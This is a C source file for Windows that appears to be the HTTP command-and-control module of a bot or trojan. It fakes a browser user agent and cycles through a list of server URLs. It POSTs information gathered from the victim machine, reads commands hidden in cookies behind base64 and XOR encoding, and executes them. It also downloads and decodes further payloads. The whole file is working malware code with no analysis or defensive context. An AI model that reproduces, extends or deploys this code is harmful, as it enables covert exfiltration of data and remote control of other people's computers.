#include <windows.h>
#include <urlmon.h>
#include <wininet.h>
#include <shlwapi.h>

#include "Globals.h"
#include "Config.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")


void HttpInteract() { //Use of this function is to be able to send the info instantly on reboot/log off/shutdown

	DWORD dWait;

	while(1) {

		WaitForSingleObject(hInteractEvent,INFINITE);
		dWait = ConnectInterval;
		Sleep(dWait);
		SetEvent(hConnectEvent);
	}
}

void HttpMain() {

	BOOL AlreadyConnected,ValidIndex,PresistInfo;
	DWORD Size,x;
	char UserAgent[128],Url[255],Commands[255],*pCommands;
	HINTERNET hConnect,hRequest;


	Size = sizeof(UserAgent);
	_memset(UserAgent,0x00,Size);
	ObtainUserAgentString(0,UserAgent,&Size);
	if(UserAgent[0]==0x00) { lstrcpy(UserAgent,"Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)"); } 

	while((hOpen = InternetOpen(UserAgent,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0)) == NULL) { Sleep(60000); } //Wait till its able to open internet connection

	x = 0;
	ValidIndex = FALSE;
	AlreadyConnected = FALSE;
	PresistInfo = FALSE;
	while(1) { //Start enumerating URLs till you find working one

	if(Urls[x]==0x00) {
		x = 0;
		Sleep(ConnectInterval);
	}

	hConnect = InternetConnect(hOpen,Urls[x],INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
	if(hConnect==NULL) { x++; ValidIndex = FALSE; continue;  }
	hRequest = HttpOpenRequest(hConnect,"POST",Pages[x],NULL,NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE,0);
	if(hRequest==NULL) { x++; ValidIndex = FALSE; InternetCloseHandle(hConnect); continue; }
    
	if(AlreadyConnected==TRUE) { //We have connected already to server once, so we dont gather full info anymore

		if(PresistInfo==FALSE) { //Last gathered info has been sent so we can gather new one

		GatherInfo(FALSE); //not full info
		PresistInfo = TRUE; //there is info to send
		}
		} else { 
			if(PresistInfo==FALSE) { //Last gathered info has been send so we can gather new one

			GatherInfo(TRUE); //full info, this is executed just once
			PresistInfo = TRUE; //there is info to send
			}
	    }


	if(HttpSendRequest(hRequest,"Content-Type:application/x-www-form-urlencoded",-1L,pHttpData,lstrlen(pHttpData))==TRUE) { //Successfully connected - get command

		//Build cookie url
		_memset(Url,0x00,sizeof(Url));
		wsprintf(Url,"http://%s%s",Urls[x],Pages[x]);
		/////////////////////////////////

		//Get cookie - commands
		_memset(Commands,0x00,sizeof(Commands));
		if(GetCookie(Url,Commands)==TRUE) { //We are on valid url

			pCommands = Commands;
			pCommands += lstrlen(response);
			//MessageBox(NULL,pCommands,"Check if valid",MB_OK);
			if(*pCommands=='$') { //This seems to be real command

				ExecCommands(pCommands);
		        ValidIndex = TRUE;
		        AlreadyConnected = TRUE;
				PresistInfo = FALSE;
			} else { ValidIndex = FALSE; }
		} else { ValidIndex = FALSE; }
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);

	if(ValidIndex==FALSE) { x++; } //there is no valid url so continue the iteration 
	else {
		HeapFree(hHeap,HEAP_ZERO_MEMORY,pHttpData);
		SetEvent(hInteractEvent);
		WaitForSingleObject(hConnectEvent,INFINITE);
	} //there is valid url
	} //main loop
}

BOOL GetCookie(char *CookieUrl, char *pCommand) { //If return TRUE - there is command, if return FALSE - there is no command

	char *pDecoded;
	DWORD CookieSize,LeftSize;


	//void ptr to get the exact size of cookie
	CookieSize = 0;
	InternetGetCookie(CookieUrl,response,NULL,&CookieSize);
	if(CookieSize<=1) { return FALSE; }
	
	pDecoded = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,CookieSize);
	_memset(pDecoded,0x00,CookieSize);

	//Get the cookie
	//MessageBox(NULL,NULL,NULL,MB_OK);
	InternetGetCookie(CookieUrl,response,pCommand,&CookieSize);

	//MessageBox(NULL,pCommand,CookieUrl,MB_OK);
	//Is there response cookie ?
	pCommand = StrStr(pCommand,response);
    if(pCommand==NULL) { return FALSE; } 

	//Url decode
	pCommand += lstrlenA(response);
	url_decode(pCommand,pDecoded);
	if(*pDecoded=='#') {  pCommand -= lstrlenA(response); lstrcpy(pCommand,pDecoded); HeapFree(hHeap,0,pDecoded); return TRUE; }

	
	LeftSize = lstrlenA(pCommand);
	_memset(pCommand,0x00,LeftSize);
	//base64 decode
	CookieSize = base64_decode(pDecoded,lstrlenA(pDecoded),pCommand,LeftSize);
	///////////////////////////////////////////////////////////////////////////////////////////////////////
	//xor
	_xor(pCommand,Key,CookieSize,lstrlenA(Key));
    ////////////////////////////////////////////////////////////////////////////////////////////////////////


	//lstrcpy(pCommand,pDecoded);
	HeapFree(hHeap,0,pDecoded);

	return TRUE;
}

char *DownloadFile(char *Url, DWORD *pFileSize) { //Need to do VirtualFree on *decoded

	HINTERNET hRequest;
	char CookieUrl[255],buffer[512],Command[64],*pCommand;
	unsigned char *saved,*decoded;
	DWORD BytesRead,Size,FileSize;


	hRequest = InternetOpenUrl(hOpen,Url,NULL,0,INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_RELOAD,0);

	_memset(Command,0x00,sizeof(Command));
	CopyTill(CookieUrl,Url,'?');
	if(GetCookie(CookieUrl,Command)==FALSE) { return NULL; } //No cookie - probably invalid url
	pCommand = Command;
	pCommand += lstrlen(response);
	pCommand++; //skip the $
	//MessageBox(NULL,pCommand,"Before GetFileSize",MB_OK);
	GetDownloadFileSize(pCommand,&FileSize);

	saved = HeapAlloc(hHeap,0,FileSize);
	decoded = VirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

	Size = 0;
	BytesRead = 0;
	_memset(buffer,0x00,sizeof(buffer));
	while(InternetReadFile(hRequest,buffer,sizeof(buffer),&BytesRead) && BytesRead != 0) {


		_memcpy(saved,buffer,BytesRead);
		saved = saved + BytesRead;
		Size += BytesRead;
		BytesRead = 0;
		_memset(buffer,0x00,sizeof(buffer));

	}

	
	
	saved = saved - Size; //restore to starting position

	Size = base64_decode(saved,Size,decoded,Size);
	_xor(decoded,Key,Size,5);


	HeapFree(hHeap,0,saved);
	InternetCloseHandle(hRequest);

	*pFileSize = Size;

	return decoded;
}

BYTE *GetDownloadFileSize(char *conf,DWORD *pFileSize) {

	char sFileSize[10];

	if(*conf!='(') { return NULL; }
	conf++; //skip '('

	conf += CopyTill(sFileSize,conf,')');

	conf++; //skip ')'

	*pFileSize = _atoi(sFileSize);

	return conf;
}